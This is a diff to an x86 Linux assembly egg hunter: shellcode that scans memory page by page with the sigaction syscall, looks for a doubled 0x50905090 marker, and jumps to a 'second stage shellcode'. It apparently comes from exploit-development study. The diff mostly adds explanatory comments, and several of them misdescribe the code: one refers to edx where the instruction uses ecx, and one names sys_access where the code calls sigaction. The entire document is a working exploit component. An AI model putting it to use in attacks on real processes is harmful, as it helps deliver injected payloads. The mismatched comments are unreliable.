@@ -14,30 +14,25 @@ section .text
 _start:
 
 	; Egg hunter v3
-	
+
 next_page:
 
-	or cx,0xfff         ; 
+	or cx,0xfff         ; Set 0x?????000 Memory alignment, next inc instruction +0x1000
 
 next_address:
 
-	inc ecx             ; 
+	inc ecx             ; edx + 1
 	xor eax, eax        ; Clear eax register
 	mov al, 0x43        ; eax = 0x00000043 = 67
 	int 0x80            ; sys_sigaction
-;	push byte +0x43
-;	pop eax
 
 	cmp al,0xf2         ; Compare return in al of sys_access with 0xf2 (EFAULT) and set ZF flag
 	jz next_page        ; if EFAULT jump to nextpage
 
 	mov eax,0x50905090  ; Set egg: X,NOP,X,NOP
-	mov edi,ecx         ;
+	mov edi,ecx         ; Move ecx pointer in edi for comparison
 	scasd               ; Compare EAX with doubleword at ES:(E)DI and set status flags
 	jnz next_address    ; If not second egg jump to next address
 	scasd               ; Compare EAX with doubleword at ES:(E)DI and set status flags
 	jnz next_address    ; If not second egg jump to next address
 	jmp edi             ; Start second stage shellcode
-
-
-
